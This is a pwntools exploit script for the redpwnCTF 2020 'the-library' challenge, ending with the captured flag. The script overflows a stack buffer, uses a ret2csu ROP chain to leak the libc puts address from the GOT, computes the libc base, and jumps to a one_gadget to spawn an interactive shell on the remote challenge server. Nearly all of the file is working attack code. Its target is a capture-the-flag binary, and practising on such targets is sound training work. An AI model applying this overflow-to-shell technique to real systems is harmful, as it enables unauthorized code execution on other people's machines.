#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './the-library'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("2020.redpwnc.tf", 31350)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def get_rop_gadgets():
    gadgets = {
        "pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret": 0x40072a,
        "mov rsi, r14; mov edi, r13d, call [r12 + rbx * 8]": 0x400713,
        "main": 0x400637
    }

    return gadgets

def leak_libc_addr(target):
    gadgets = get_rop_gadgets()

    puts_got = 0x601018

    padding = b'aaaabaaacaaadaaaeaaafaaa'

    payload = padding
    payload += p64(gadgets["pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret"]) # rip
    payload += p64(0x00) # rbx
    payload += p64(0x01) # rbp
    payload += p64(puts_got) # r12 => [rip]
    payload += p64(puts_got) # r13 => edi
    payload += b'B'*8 # r14
    payload += b'C'*8 # r15
    payload += p64(gadgets["mov rsi, r14; mov edi, r13d, call [r12 + rbx * 8]"]) # rip
    payload += b'J'*8
    payload += b'K'*8 # rbx
    payload += b'L'*8 # rbp
    payload += b'L'*8 # r12
    payload += b'L'*8 # r13 
    payload += b'L'*8 # r14
    payload += b'L'*8 # r15
    payload += p64(gadgets["main"]) # rip

    io.recvline()
    io.sendline(payload)
    response = io.recvuntil(b"What's your name?")
    libc_addr = u64(response.split(b'\n')[2].ljust(8, b'\x00'))
    log.info(f"libc puts = {hex(libc_addr)}")
    return libc_addr

def trigger_one_gadget(tube, one_gadget): 
    padding = b'aaaabaaacaaadaaaeaaafaaa'
    payload = padding
    payload += p64(one_gadget) # rip
    payload += b'\x00'*300

    tube.sendline(payload)

io = start()
libc_puts = leak_libc_addr(io)
libc_base = libc_puts - 0x809c0
one_gadget = libc_base + 1090444
print("libc_puts = ", hex(libc_puts))
print("libc_base = ", hex(libc_base))
print("one_gadget = ", hex(one_gadget))

trigger_one_gadget(io, one_gadget)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

# flag{jump_1nt0_th3_l1brary}
